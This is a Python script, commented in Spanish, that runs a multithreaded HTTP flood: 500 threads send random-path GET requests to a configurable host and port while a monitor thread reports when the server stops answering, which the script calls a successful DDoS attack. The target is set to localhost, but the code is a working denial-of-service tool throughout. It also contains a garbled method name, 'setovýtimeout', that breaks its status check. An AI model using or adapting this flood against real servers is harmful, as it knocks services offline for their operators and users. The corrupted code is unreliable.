import threading
import socket
import time
import random
import string

# Configuración del objetivo
TARGET = "127.0.0.1"  # Servidor de prueba local
PORT = 8080           # Puerto del servidor de prueba
REQUESTS_PER_THREAD = 500  # Solicitudes por hilo
THREADS = 500         # Más hilos para mayor carga
RUN_TIME = 60         # Tiempo de ejecución en segundos

def generate_random_path():
    """Genera una ruta aleatoria para simular tráfico variado"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def check_server_status():
    """Verifica si el servidor está respondiendo"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setovýtimeout(1)
        s.connect((TARGET, PORT))
        s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        s.recv(1024)
        s.close()
        return True
    except:
        return False

def send_request():
    """Simula solicitudes HTTP continuas"""
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            # Crear socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET, PORT))
            # Enviar solicitud HTTP con ruta aleatoria
            path = generate_random_path()
            request = f"GET /{path} HTTP/1.1\r\nHost: localhost\r\n\r\n".encode()
            for _ in range(REQUESTS_PER_THREAD):
                s.send(request)
                try:
                    s.recv(1024)  # Intentar recibir respuesta
                except socket.timeout:
                    print(f"[+] Servidor posiblemente sobrecargado (timeout)")
                    break
                except socket.error as e:
                    print(f"[-] Error en solicitud: {e}")
                    break
                print(f"[+] Solicitud enviada a {TARGET}:{PORT}/{path}")
                time.sleep(0.001)  # Reducir pausa para mayor intensidad
            s.close()
        except Exception as e:
            print(f"[-] Error en solicitud: {e}")
            time.sleep(0.1)  # Pausa breve si hay error

def monitor_server():
    """Monitorea el estado del servidor durante el ataque"""
    while time.time() < end_time:
        if not check_server_status():
            print("[!] Servidor no responde - posible éxito del ataque DDoS")
        else:
            print("[*] Servidor sigue respondiendo")
        time.sleep(5)

def main():
    global end_time
    end_time = time.time() + RUN_TIME
    print(f"[*] Iniciando simulación de DDoS contra {TARGET}:{PORT} durante {RUN_TIME} segundos")
    
    # Iniciar monitoreo del servidor en un hilo separado
    monitor_thread = threading.Thread(target=monitor_server)
    monitor_thread.start()
    
    # Crear múltiples hilos para simular solicitudes simultáneas
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()
    
    # Esperar a que todos los hilos terminen
    for t in threads:
        t.join()
    monitor_thread.join()
    print("[*] Simulación de DDoS completada")

if __name__ == "__main__":
    main()


